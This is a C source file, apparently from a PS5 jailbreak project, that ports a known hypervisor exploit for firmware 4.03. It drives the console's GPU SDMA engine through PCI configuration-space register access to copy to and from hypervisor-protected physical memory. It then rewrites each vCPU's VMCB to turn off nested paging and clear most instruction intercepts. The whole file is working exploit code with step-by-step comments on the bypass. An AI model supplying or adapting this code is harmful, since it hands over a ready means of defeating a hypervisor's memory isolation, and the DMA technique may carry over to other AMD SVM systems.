/*
 * VMCB (Virtual Machine Control Block) patching via GPU SDMA.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03,
 * using flatz's GPU method for accessing HV-protected memory.
 *
 * The PS5 hypervisor uses AMD SVM with nested paging to isolate
 * guest memory. The VMCB controls VM execution:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * Disabling NP and clearing intercepts gives the kernel direct
 * access to all physical memory without HV mediation.
 *
 * The x86 CPU cannot access VMCB physical addresses because the
 * HV's nested page tables (NPT) don't map them for the guest.
 * DMAP access causes #NPF → instant kernel panic.
 *
 * After TMR bypass (which enables all source access including GFX),
 * the GPU's SDMA engine can DMA-copy between any physical addresses.
 * The GPU goes through the IOMMU, completely bypassing x86 NPT.
 *
 * We use SDMA to copy VMCB data to/from accessible bounce buffers,
 * modify the data, and write it back.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <ps5/kernel.h>
#include "prosperous.h"
#include "pci.h"

/* Number of vCPU contexts to patch */
#define MAX_VCPUS   16

/* vCPU context structure stride and VMCB pointer offset */
#define VCPU_CTX_SIZE       0x320
#define VCPU_CTX_VMCB_OFF   0x08

/* SMN (System Management Network) access via PCI B0:D0:F0 */
#define SMN_INDEX_OFFSET    0x60
#define SMN_DATA_OFFSET     0x64

/* ================================================================
 * SDMA v5.2 register access via SMN (System Management Network)
 *
 * GPU MMIO (BAR0 at PA 0xD0000000) is NOT mapped in the guest NPT,
 * so any DMAP access to it causes #NPF → kernel panic.
 *
 * Instead, we access GPU registers through SMN, which routes via
 * PCI config space (B0:D0:F0 index/data at 0x60/0x64) — this IS
 * accessible to the guest.
 *
 * Two known SMN address sets for SDMA0:
 *   v1: STATUS at 0x12580  (Navi1x / early RDNA2)
 *   v2: STATUS at 0x13200  (Navi2x / later RDNA2)
 * Both share the same relative register layout from STATUS base.
 * ================================================================ */

/* SMN SDMA0 register offsets (relative to g_smn_sdma0_base) */
#define SMN_SDMA0_OFF_STATUS      0x00
#define SMN_SDMA0_OFF_RB_CNTL     0x80
#define SMN_SDMA0_OFF_RB_BASE     0x84
#define SMN_SDMA0_OFF_RB_BASE_HI  0x88
#define SMN_SDMA0_OFF_RB_RPTR     0x8C
#define SMN_SDMA0_OFF_RB_WPTR     0x94

/* Candidate SMN bases for SDMA0 STATUS register */
#define SMN_SDMA0_BASE_V1         0x00012580
#define SMN_SDMA0_BASE_V2         0x00013200

/* SDMA opcodes */
#define SDMA_OP_NOP     0
#define SDMA_OP_COPY    1
#define SDMA_OP_WRITE   2
#define SDMA_OP_FENCE   5
#define SDMA_PKT_HDR(op, subop) (((op) & 0xFF) | (((subop) & 0xFF) << 8))

/* ================================================================
 * GPU state
 * ================================================================ */

static uint32_t g_smn_sdma0_base;  /* SMN address of SDMA0 STATUS register */
static uint64_t g_dmap_base;       /* Kernel DMAP base VA */
static uint64_t g_proc_cr3;       /* Process page table root PA */

/* SDMA ring buffer state */
static uint64_t g_rb_pa;       /* Ring buffer physical address */
static uint32_t g_rb_size;     /* Ring buffer size in bytes */

/* ================================================================
 * Helpers
 * ================================================================ */

/* Forward declaration — defined in GPU discovery section below */
static uint32_t gpu_smn_read32(uint32_t addr);

/*
 * Read/write SDMA registers via SMN.
 * smn_off is a SMN_SDMA0_OFF_* constant (relative to g_smn_sdma0_base).
 */
static uint32_t sdma_reg_read(uint32_t smn_off)
{
    return gpu_smn_read32(g_smn_sdma0_base + smn_off);
}

static void sdma_reg_write(uint32_t smn_off, uint32_t val)
{
    uint64_t idx_kva = g_dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
    uint64_t dat_kva = g_dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;
    uint32_t addr = g_smn_sdma0_base + smn_off;
    kernel_copyin(&addr, idx_kva, 4);
    kernel_copyin(&val, dat_kva, 4);
}

/*
 * Translate userspace VA to physical address via guest page table walk.
 */
static uint64_t va_to_pa(uint64_t va)
{
    uint64_t paddr = g_proc_cr3;
    int levels_from[] = {39, 30, 21, 12};
    int levels_to[]   = {47, 38, 29, 20};
    uint64_t level_size[] = {1ULL << 39, 1ULL << 30, 1ULL << 21, 1ULL << 12};

    for (int i = 0; i < 4; i++) {
        uint64_t pd[512];
        kernel_copyout(g_dmap_base + paddr, pd, sizeof(pd));

        uint64_t idx = (va >> levels_from[i]) &
                       ((1ULL << (levels_to[i] - levels_from[i] + 1)) - 1);
        uint64_t pde = pd[idx];

        if (!(pde & 1))
            return 0;

        paddr = pde & 0xFFFFFFFFF000ULL;

        if ((pde & (1ULL << 7)) || i == 3)
            return paddr | (va & (level_size[i] - 1));
    }
    return 0;
}

/* ================================================================
 * GPU discovery
 * ================================================================ */

/*
 * SMN read/write for GPU discovery (via PCI B0:D0:F0 index/data).
 */
static uint32_t gpu_smn_read32(uint32_t addr)
{
    uint64_t idx_kva = g_dmap_base + PCI_B0D0F0 + SMN_INDEX_OFFSET;
    uint64_t dat_kva = g_dmap_base + PCI_B0D0F0 + SMN_DATA_OFFSET;
    uint32_t val;
    kernel_copyin(&addr, idx_kva, 4);
    kernel_copyout(dat_kva, &val, 4);
    return val;
}

/*
 * Find the GPU and probe SMN for SDMA register access.
 *
 * GPU MMIO via DMAP panics (NPT doesn't map BAR0 at 0xD0000000 for guest).
 * All GPU register access must go through SMN (via PCI B0:D0:F0 config space).
 *
 * We probe two known SMN address sets for SDMA0 and pick whichever responds
 * with plausible register values.
 */
static int gpu_find(void)
{
    printf("[GPU] Probing GPU via SMN...\n");

    /* Verify GPU is alive via GRBM_STATUS */
    uint32_t grbm = gpu_smn_read32(0x00028000);
    printf("[SMN] GRBM_STATUS = 0x%08x\n", grbm);

    /* Dump some diagnostic registers */
    struct { uint32_t addr; const char *name; } diag[] = {
        { 0x00100000, "BIF_VENDOR_ID" },
        { 0x00100008, "BIF_REV_CLASS" },
        { 0x0003A000, "MMHUB_FB_LOC_BASE" },
        { 0x0003A004, "MMHUB_FB_LOC_TOP" },
    };
    for (int i = 0; i < (int)(sizeof(diag)/sizeof(diag[0])); i++) {
        uint32_t val = gpu_smn_read32(diag[i].addr);
        printf("[SMN] %s = 0x%08x\n", diag[i].name, val);
    }

    /* Probe both SDMA0 SMN address sets.
     * For each candidate base, read STATUS and RB_CNTL.
     * A working set will have at least one non-zero, non-0xFFFFFFFF value. */
    uint32_t candidates[] = { SMN_SDMA0_BASE_V1, SMN_SDMA0_BASE_V2 };
    const char *names[] = { "v1 (0x12580)", "v2 (0x13200)" };

    for (int i = 0; i < 2; i++) {
        uint32_t base = candidates[i];
        uint32_t status  = gpu_smn_read32(base + SMN_SDMA0_OFF_STATUS);
        uint32_t rb_cntl = gpu_smn_read32(base + SMN_SDMA0_OFF_RB_CNTL);
        uint32_t rb_base = gpu_smn_read32(base + SMN_SDMA0_OFF_RB_BASE);
        uint32_t rb_rptr = gpu_smn_read32(base + SMN_SDMA0_OFF_RB_RPTR);
        uint32_t rb_wptr = gpu_smn_read32(base + SMN_SDMA0_OFF_RB_WPTR);

        printf("[SMN] SDMA0 %s: status=0x%08x cntl=0x%08x base=0x%08x "
               "rptr=0x%08x wptr=0x%08x\n",
               names[i], status, rb_cntl, rb_base, rb_rptr, rb_wptr);

        /* Accept if RB_CNTL has a plausible ring size (non-zero, non-FF) */
        if (rb_cntl != 0 && rb_cntl != 0xFFFFFFFF) {
            g_smn_sdma0_base = base;
            printf("[GPU] Using SMN SDMA0 base: %s\n", names[i]);
            return 0;
        }
    }

    /* If neither SDMA set responded, dump more SMN ranges for diagnostics */
    printf("[!] Neither SDMA0 SMN address set responded.\n");
    printf("[SMN] Probing extended SDMA address range...\n");
    uint32_t probe_ranges[][2] = {
        { 0x00012000, 0x00013400 },  /* Standard SDMA range */
        { 0x0001A000, 0x0001B400 },  /* Possible SDMA1 range */
    };
    for (int r = 0; r < 2; r++) {
        for (uint32_t a = probe_ranges[r][0]; a < probe_ranges[r][1]; a += 0x80) {
            uint32_t v = gpu_smn_read32(a);
            if (v != 0 && v != 0xFFFFFFFF)
                printf("[SMN] 0x%08x = 0x%08x\n", a, v);
        }
    }

    printf("[!] GPU: SMN SDMA discovery failed\n");
    return -1;
}

/* ================================================================
 * SDMA engine interface
 * ================================================================ */

/*
 * Initialize SDMA by reading current ring buffer configuration.
 * The kernel/driver has already set up the SDMA engine — we
 * piggyback on the existing ring buffer.
 */
static int sdma_init(void)
{
    uint32_t status = sdma_reg_read(SMN_SDMA0_OFF_STATUS);
    uint32_t rb_cntl = sdma_reg_read(SMN_SDMA0_OFF_RB_CNTL);
    uint32_t rb_base_lo = sdma_reg_read(SMN_SDMA0_OFF_RB_BASE);
    uint32_t rb_base_hi = sdma_reg_read(SMN_SDMA0_OFF_RB_BASE_HI);
    uint32_t rb_rptr = sdma_reg_read(SMN_SDMA0_OFF_RB_RPTR);
    uint32_t rb_wptr = sdma_reg_read(SMN_SDMA0_OFF_RB_WPTR);

    g_rb_pa = ((uint64_t)rb_base_hi << 32) | ((uint64_t)rb_base_lo << 8);
    g_rb_size = 1 << (((rb_cntl >> 1) & 0x1F) + 1);

    printf("[SDMA] status=0x%08x cntl=0x%08x\n", status, rb_cntl);
    printf("[SDMA] ring PA=0x%llx size=%u bytes\n",
           (unsigned long long)g_rb_pa, g_rb_size);
    printf("[SDMA] rptr=0x%x wptr=0x%x\n", rb_rptr, rb_wptr);

    if (g_rb_pa == 0 || g_rb_size == 0) {
        printf("[!] SDMA: Ring buffer not initialized by driver\n");
        return -1;
    }

    return 0;
}

/*
 * Submit an SDMA copy command: src_pa → dst_pa, len bytes.
 * Appends copy + fence to the ring buffer, advances wptr,
 * and waits for the fence to complete.
 *
 * bounce_pa + 0x800 is used as the fence address.
 * The caller must ensure bounce_pa points to a mapped+writable page.
 */
static int sdma_copy(uint64_t src_pa, uint64_t dst_pa, uint32_t len,
                     volatile uint32_t *fence_va, uint64_t fence_pa)
{
    /* Build SDMA packets */
    uint32_t cmd[16];
    int n = 0;

    /* Linear copy: 6 DWORDs */
    cmd[n++] = SDMA_PKT_HDR(SDMA_OP_COPY, 0);
    cmd[n++] = (len - 1) & 0x3FFFFF;
    cmd[n++] = (uint32_t)(src_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(src_pa >> 32);
    cmd[n++] = (uint32_t)(dst_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(dst_pa >> 32);

    /* Fence: 4 DWORDs */
    cmd[n++] = SDMA_PKT_HDR(SDMA_OP_FENCE, 0);
    cmd[n++] = (uint32_t)(fence_pa & 0xFFFFFFFF);
    cmd[n++] = (uint32_t)(fence_pa >> 32);
    cmd[n++] = 0xCAFEDEAD;

    /* Clear fence */
    *fence_va = 0;

    /* Read current wptr */
    uint32_t wptr = sdma_reg_read(SMN_SDMA0_OFF_RB_WPTR);

    /* Check if there's enough space in the ring */
    uint32_t wptr_bytes = wptr * 4;
    if (wptr_bytes + n * 4 > g_rb_size) {
        /* Wrap: pad with NOPs to end, then write at beginning */
        uint32_t nop = SDMA_PKT_HDR(SDMA_OP_NOP, 0);
        while (wptr_bytes + 4 <= g_rb_size) {
            kernel_copyin(&nop, g_dmap_base + g_rb_pa + wptr_bytes, 4);
            wptr_bytes += 4;
        }
        wptr = 0;
        wptr_bytes = 0;
    }

    /* Write command to ring buffer */
    kernel_copyin(cmd, g_dmap_base + g_rb_pa + (uint64_t)wptr * 4, n * 4);

    /* Advance write pointer */
    uint32_t new_wptr = wptr + n;
    sdma_reg_write(SMN_SDMA0_OFF_RB_WPTR, new_wptr);

    /* Wait for fence completion */
    for (int timeout = 0; timeout < 2000000; timeout++) {
        if (*fence_va == 0xCAFEDEAD)
            return 0;
    }

    /* Timeout — dump SDMA state for diagnosis */
    uint32_t new_rptr = sdma_reg_read(SMN_SDMA0_OFF_RB_RPTR);
    uint32_t new_status = sdma_reg_read(SMN_SDMA0_OFF_STATUS);
    printf("[!] SDMA timeout: fence=0x%08x rptr=0x%x->0x%x status=0x%08x\n",
           *fence_va, wptr, new_rptr, new_status);
    return -1;
}

/* ================================================================
 * Physical memory read/write via GPU SDMA
 *
 * Uses a bounce buffer page:
 *   [0x000-0x7FF] data area (up to 2048 bytes)
 *   [0x800]       fence DWORD
 * ================================================================ */

struct sdma_bounce {
    void *va;                   /* mmap'd bounce buffer */
    uint64_t pa;                /* physical address */
    volatile uint32_t *fence;   /* fence VA (bounce + 0x800) */
    uint64_t fence_pa;          /* fence PA */
};

static int bounce_init(struct sdma_bounce *b)
{
    b->va = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (b->va == MAP_FAILED) return -1;

    /* Touch page to ensure it's faulted in */
    memset(b->va, 0, 4096);

    b->pa = va_to_pa((uint64_t)b->va);
    if (b->pa == 0) {
        munmap(b->va, 4096);
        return -2;
    }

    b->fence = (volatile uint32_t *)((uint8_t *)b->va + 0x800);
    b->fence_pa = b->pa + 0x800;
    return 0;
}

static void bounce_free(struct sdma_bounce *b)
{
    if (b->va && b->va != MAP_FAILED)
        munmap(b->va, 4096);
    b->va = NULL;
}

/*
 * Read `len` bytes from physical address `src_pa` into `dst`.
 * Uses SDMA to copy src_pa → bounce_pa, then memcpy bounce → dst.
 */
static int sdma_read_phys(struct sdma_bounce *b,
                          uint64_t src_pa, void *dst, uint32_t len)
{
    if (len > 2048) return -1;
    memset(b->va, 0, len);

    int ret = sdma_copy(src_pa, b->pa, len, b->fence, b->fence_pa);
    if (ret != 0) return ret;

    memcpy(dst, b->va, len);
    return 0;
}

/*
 * Write `len` bytes from `src` to physical address `dst_pa`.
 * Copies src → bounce buffer, then SDMA bounce_pa → dst_pa.
 */
static int sdma_write_phys(struct sdma_bounce *b,
                           const void *src, uint64_t dst_pa, uint32_t len)
{
    if (len > 2048) return -1;
    memcpy(b->va, src, len);

    return sdma_copy(b->pa, dst_pa, len, b->fence, b->fence_pa);
}

/* ================================================================
 * VMCB patching
 * ================================================================ */

int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    int ret;
    int patched = 0;

    g_dmap_base = ctx->dmap_base;
    g_proc_cr3 = ctx->proc_cr3;

    printf("[VMCB] === GPU SDMA VMCB Patching ===\n");
    printf("[VMCB] VCPU contexts at system PA 0x%llx\n",
           (unsigned long long)vcpu_ctxs_pa);

    /* Step 1: Find GPU */
    ret = gpu_find();
    if (ret != 0) return ret;

    /* Step 2: Initialize SDMA */
    ret = sdma_init();
    if (ret != 0) return ret;

    /* Step 3: Allocate bounce buffer */
    struct sdma_bounce bounce;
    ret = bounce_init(&bounce);
    if (ret != 0) {
        printf("[!] VMCB: Bounce buffer init failed: %d\n", ret);
        return ret;
    }
    printf("[VMCB] Bounce buffer: VA=%p PA=0x%llx\n",
           bounce.va, (unsigned long long)bounce.pa);

    /* Step 4: Test SDMA with a read from HV data area.
     * First qword at PA 0x62848000 = HV virtual address base. */
    printf("[VMCB] Testing SDMA read from HV PA 0x62848000...\n");

    uint64_t hv_va_base = 0;
    ret = sdma_read_phys(&bounce, 0x62848000ULL, &hv_va_base, 8);
    if (ret != 0) {
        printf("[!] VMCB: SDMA test read failed: %d\n", ret);
        bounce_free(&bounce);
        return ret;
    }

    printf("[VMCB] HV VA base: 0x%llx\n", (unsigned long long)hv_va_base);

    if (hv_va_base == 0 || hv_va_base == 0xFFFFFFFFFFFFFFFFULL) {
        printf("[!] VMCB: Invalid HV VA base — TMR not bypassed?\n");
        bounce_free(&bounce);
        return -1;
    }

    /* Step 5: Patch each vCPU's VMCB */
    for (int i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;

        /* Read VMCB virtual address from vCPU context */
        uint64_t vmcb_va = 0;
        ret = sdma_read_phys(&bounce, ctx_pa, &vmcb_va, 8);
        if (ret != 0 || vmcb_va == 0) continue;

        /* Convert HV VA to system PA */
        uint64_t vmcb_pa = vmcb_va - hv_va_base;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        uint64_t np_ctrl = 0;
        ret = sdma_read_phys(&bounce, vmcb_pa + VMCB_NP_CTRL, &np_ctrl, 8);
        if (ret != 0) continue;

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0) break;

        /* Sanity check: NP_CTRL should be 0x09 */
        if ((np_ctrl & 0xFF) != 0x09) {
            printf("[!] VMCB %d: unexpected NP_CTRL=0x%llx\n",
                   i, (unsigned long long)np_ctrl);
            bounce_free(&bounce);
            return -1;
        }

        /* Read the first 0x14 bytes of VMCB control area (intercept vectors) */
        uint8_t ctrl_buf[0x14];
        memset(ctrl_buf, 0, sizeof(ctrl_buf));
        ret = sdma_read_phys(&bounce, vmcb_pa, ctrl_buf, 0x14);
        if (ret != 0) {
            printf("[!] VMCB %d: intercept read failed\n", i);
            continue;
        }

        uint32_t *vec0 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC0);
        uint32_t *vec3 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC3);
        uint32_t *vec4 = (uint32_t *)(ctrl_buf + VMCB_INTERCEPT_VEC4);

        uint32_t orig_vec3 = *vec3;
        uint32_t cpuid_intercept = orig_vec3 & (1 << 18);

        /* Patch: disable NP */
        uint64_t zero = 0;
        ret = sdma_write_phys(&bounce, &zero, vmcb_pa + VMCB_NP_CTRL, 8);
        if (ret != 0) {
            printf("[!] VMCB %d: NP write failed\n", i);
            continue;
        }

        /* Patch intercepts */
        *vec0 = 0;                  /* Clear all CR/DR intercepts */
        *vec3 = cpuid_intercept;    /* Keep only CPUID intercept */
        *vec4 = 0x0F;              /* Keep VMSAVE/VMLOAD/VMMCALL/VMRUN */

        ret = sdma_write_phys(&bounce, ctrl_buf, vmcb_pa, 0x14);
        if (ret != 0) {
            printf("[!] VMCB %d: intercept write failed\n", i);
            continue;
        }

        patched++;
        printf("[VMCB] Patched vCPU %d: sysPA=0x%llx NP 0x%llx->0\n",
               i, (unsigned long long)vmcb_pa, (unsigned long long)np_ctrl);
    }

    bounce_free(&bounce);
    printf("[VMCB] Patched %d VMCBs via GPU SDMA\n", patched);
    return (patched > 0) ? 0 : -1;
}
